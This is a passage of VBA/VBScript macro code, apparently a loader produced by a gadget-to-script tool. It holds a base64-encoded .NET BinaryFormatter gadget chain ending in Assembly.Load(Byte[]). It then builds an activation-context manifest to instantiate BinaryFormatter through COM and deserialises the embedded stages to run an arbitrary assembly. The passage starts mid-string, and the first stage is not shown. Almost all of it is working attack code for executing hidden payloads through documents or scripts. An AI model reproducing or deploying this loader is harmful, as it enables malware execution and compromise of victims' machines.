stage_2 = stage_2 & "NzdhNWM1NjE5MzRlMDg5EBAAAAAHAAAACQMAAAAKCSQAAAAKCAgAAAAACggIAQAAAAERAAAADwAAAAYlAAAA9QJTeXN0ZW0uTGlu"
stage_2 = stage_2 & "cS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBt"
stage_2 = stage_2 & "c2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODld"
stage_2 = stage_2 & "LFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249"
stage_2 = stage_2 & "NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJz"
stage_2 = stage_2 & "aW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkiAAAAEBIA"
stage_2 = stage_2 & "AAAHAAAACQQAAAAKCSgAAAAKCAgAAAAACggIAQAAAAETAAAADwAAAAYpAAAA3wNTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJl"
stage_2 = stage_2 & "U2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhYmxlYDFbW1N5c3Rl"
stage_2 = stage_2 & "bS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2"
stage_2 = stage_2 & "MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"
stage_2 = stage_2 & "NWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29y"
stage_2 = stage_2 & "bGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBt"
stage_2 = stage_2 & "c2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODld"
stage_2 = stage_2 & "XQQAAAAJIgAAABAUAAAABwAAAAkFAAAACgksAAAACggIAAAAAAoICAEAAAABFQAAAA8AAAAGLQAAAOYCU3lzdGVtLkxpbnEuRW51"
stage_2 = stage_2 & "bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVy"
stage_2 = stage_2 & "YXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlU"
stage_2 = stage_2 & "b2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGlj"
stage_2 = stage_2 & "S2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJl"
stage_2 = stage_2 & "PW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABAWAAAABwAAAAkGAAAACTAAAAAJMQAA"
stage_2 = stage_2 & "AAoICAAAAAAKCAgBAAAAARcAAAAPAAAABjIAAADvAVN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxl"
stage_2 = stage_2 & "SXRlcmF0b3JgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGlj"
stage_2 = stage_2 & "S2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1"
stage_2 = stage_2 & "cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkiAAAAEBgAAAAHAAAACQcAAAAKCTUAAAAK"
stage_2 = stage_2 & "CAgAAAAACggIAQAAAAEZAAAADwAAAAY2AAAAKVN5c3RlbS5XZWIuVUkuV2ViQ29udHJvbHMuUGFnZWREYXRhU291cmNlBAAAAAY3"
stage_2 = stage_2 & "AAAATVN5c3RlbS5XZWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iMDNmNWY3ZjEx"
stage_2 = stage_2 & "ZDUwYTNhEBoAAAAHAAAACQgAAAAICAAAAAAICAoAAAAIAQAIAQAIAQAICAAAAAABGwAAAA8AAAAGOQAAAClTeXN0ZW0uQ29tcG9u"
stage_2 = stage_2 & "ZW50TW9kZWwuRGVzaWduLkRlc2lnbmVyVmVyYgQAAAAGOgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0"
stage_2 = stage_2 & "cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5EBwAAAAFAAAADQIJOwAAAAgIAwAAAAkLAAAAAR0AAAAPAAAABj0A"
stage_2 = stage_2 & "AAA0U3lzdGVtLlJ1bnRpbWUuUmVtb3RpbmcuQ2hhbm5lbHMuQWdncmVnYXRlRGljdGlvbmFyeQQAAAAGPgAAAEttc2NvcmxpYiwg"
stage_2 = stage_2 & "VmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQHgAAAAEAAAAJ"
stage_2 = stage_2 & "CQAAABAfAAAAAgAAAAkKAAAACQoAAAAQIAAAAAIAAAAGQQAAAAAJQQAAAAQkAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRp"
stage_2 = stage_2 & "b25Ib2xkZXICAAAACERlbGVnYXRlB21ldGhvZDADAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"
stage_2 = stage_2 & "RW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJQgAAAAlDAAAAASgAAAAkAAAACUQA"
stage_2 = stage_2 & "AAAJRQAAAAEsAAAAJAAAAAlGAAAACUcAAAABMAAAACQAAAAJSAAAAAlJAAAAATEAAAAkAAAACUoAAAAJSwAAAAE1AAAAJAAAAAlM"
stage_2 = stage_2 & "AAAACU0AAAABOwAAAAQAAAAJTgAAAAlPAAAABEIAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0"
stage_2 = stage_2 & "ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFt"
stage_2 = stage_2 & "ZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGUAAA"
stage_2 = stage_2 & "ANUBU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFs"
stage_2 = stage_2 & "LCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBW"
stage_2 = stage_2 & "ZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4A"
stage_2 = stage_2 & "AAAGUgAAABpTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseQZTAAAABExvYWQKBEMAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVy"
stage_2 = stage_2 & "SW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJl"
stage_2 = stage_2 & "MgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCVMAAAAJPgAAAAlSAAAABlYAAAAnU3lz"
stage_2 = stage_2 & "dGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10pBlcAAAAuU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkgTG9hZChT"
stage_2 = stage_2 & "eXN0ZW0uQnl0ZVtdKQgAAAAKAUQAAABCAAAABlgAAADMAlN5c3RlbS5GdW5jYDJbW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5"
stage_2 = stage_2 & "LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUw"
stage_2 = stage_2 & "ODldLFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNp"
stage_2 = stage_2 & "b249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBW"
stage_2 = stage_2 & "ZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4A"
stage_2 = stage_2 & "AAAJUgAAAAZbAAAACEdldFR5cGVzCgFFAAAAQwAAAAlbAAAACT4AAAAJUgAAAAZeAAAAGFN5c3RlbS5UeXBlW10gR2V0VHlwZXMo"
stage_2 = stage_2 & "KQZfAAAAGFN5c3RlbS5UeXBlW10gR2V0VHlwZXMoKQgAAAAKAUYAAABCAAAABmAAAAC2A1N5c3RlbS5GdW5jYDJbW1N5c3RlbS5D"
stage_2 = stage_2 & "b2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhYmxlYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBD"
stage_2 = stage_2 & "dWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAu"
stage_2 = stage_2 & "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdl"
stage_2 = stage_2 & "bmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJh"
stage_2 = stage_2 & "bCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5l"
stage_2 = stage_2 & "dXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABmIAAACEAVN5c3RlbS5Db2xsZWN0aW9u"
stage_2 = stage_2 & "cy5HZW5lcmljLklFbnVtZXJhYmxlYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5l"
stage_2 = stage_2 & "dXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQZjAAAADUdldEVudW1lcmF0b3IKAUcAAABDAAAACWMAAAAJ"
stage_2 = stage_2 & "PgAAAAliAAAABmYAAABFU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtTeXN0ZW0uVHlwZV0gR2V0RW51"
stage_2 = stage_2 & "bWVyYXRvcigpBmcAAACUAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2Nv"
stage_2 = stage_2 & "cmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSBH"
stage_2 = stage_2 & "ZXRFbnVtZXJhdG9yKCkIAAAACgFIAAAAQgAAAAZoAAAAwAJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJp"
stage_2 = stage_2 & "Yy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQ"
stage_2 = stage_2 & "dWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJh"
stage_2 = stage_2 & "bCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Cb29sZWFuLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAu"
stage_2 = stage_2 & "MC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABmoAAAAeU3lz"
stage_2 = stage_2 & "dGVtLkNvbGxlY3Rpb25zLklFbnVtZXJhdG9yBmsAAAAITW92ZU5leHQKAUkAAABDAAAACWsAAAAJPgAAAAlqAAAABm4AAAASQm9v"
stage_2 = stage_2 & "bGVhbiBNb3ZlTmV4dCgpBm8AAAAZU3lzdGVtLkJvb2xlYW4gTW92ZU5leHQoKQgAAAAKAUoAAABCAAAABnAAAAC9AlN5c3RlbS5G"
stage_2 = stage_2 & "dW5jYDJbW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVy"
stage_2 = stage_2 & "c2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIs"
stage_2 = stage_2 & "IFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVt"
stage_2 = stage_2 & "LlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYx"
stage_2 = stage_2 & "OTM0ZTA4OV1dCT4AAAAKCT4AAAAGcgAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVt"
stage_2 = stage_2 & "LlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYx"
stage_2 = stage_2 & "OTM0ZTA4OV1dBnMAAAALZ2V0X0N1cnJlbnQKAUsAAABDAAAACXMAAAAJPgAAAAlyAAAABnYAAAAZU3lzdGVtLlR5cGUgZ2V0X0N1"
stage_2 = stage_2 & "cnJlbnQoKQZ3AAAAGVN5c3RlbS5UeXBlIGdldF9DdXJyZW50KCkIAAAACgFMAAAAQgAAAAZ4AAAAxgFTeXN0ZW0uRnVuY2AyW1tT"
stage_2 = stage_2 & "eXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"
stage_2 = stage_2 & "NWM1NjE5MzRlMDg5XSxbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQ"
stage_2 = stage_2 & "dWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZ6AAAAEFN5c3RlbS5BY3RpdmF0b3IGewAAAA5DcmVh"
stage_2 = stage_2 & "dGVJbnN0YW5jZQoBTQAAAEMAAAAJewAAAAk+AAAACXoAAAAGfgAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3Rl"
stage_2 = stage_2 & "bS5UeXBlKQZ/AAAAKVN5c3RlbS5PYmplY3QgQ3JlYXRlSW5zdGFuY2UoU3lzdGVtLlR5cGUpCAAAAAoBTgAAAA8AAAAGgAAAACZT"
stage_2 = stage_2 & "eXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWduLkNvbW1hbmRJRAQAAAAJOgAAABBPAAAAAgAAAAmCAAAACAgAIAAABIIAAAALU3lz"
stage_2 = stage_2 & "dGVtLkd1aWQLAAAAAl9hAl9iAl9jAl9kAl9lAl9mAl9nAl9oAl9pAl9qAl9rAAAAAAAAAAAAAAAIBwcCAgICAgICAhMT0nTuKtER"
stage_2 = stage_2 & "i/sAoMkPJvcLCw=="


    Dim stm_1 As Object, fmt_1 As Object
    
    manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?>"
	manifest = manifest & "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
	manifest = manifest & "<assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />"
	manifest = manifest & "<clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Serialization"
	manifest = manifest & ".Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" "
	manifest = manifest & "runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" "
	manifest = manifest & "progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" /></assembly>"


    Set actCtx = CreateObject("Microsoft.Windows.ActCtx")
    actCtx.ManifestText = manifest
        
    Set stm_1 = actCtx.CreateObject("System.IO.MemoryStream")
    Set fmt_1 = actCtx.CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")

    Dim Decstage_1
    Decstage_1 = b64Decode(stage_1)

    For Each i In Decstage_1
        stm_1.WriteByte i
    Next i

    On Error Resume Next

    stm_1.Position = 0
    Dim o1 As Object
    Set o1 = fmt_1.Deserialize_2(stm_1)

    If Err.Number <> 0 Then
       Dim stm_2 As Object
       
       Set stm_2 = actCtx.CreateObject("System.IO.MemoryStream")

       Dim Decstage_2
       Decstage_2 = b64Decode(stage_2)

       For Each j In Decstage_2
        stm_2.WriteByte j
       Next j

       stm_2.Position = 0
       Dim o2 As Object
       Set o2 = fmt_1.Deserialize_2(stm_2)
    End If

End Function
